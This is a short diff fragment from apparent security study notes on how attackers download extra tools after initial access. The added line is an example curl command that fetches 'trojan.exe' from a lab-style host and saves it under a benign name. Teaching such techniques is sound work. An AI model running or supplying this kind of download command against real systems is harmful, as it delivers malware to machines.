@@ -188,6 +188,8 @@ Attackers often **download extra tools after initial access** to expand capabili
 
 ### Common Transfer Methods
 
+example: curl http://appsforfree.thm/trojan.exe -o good.ext 
+
 * **Certutil**
 
   ```text
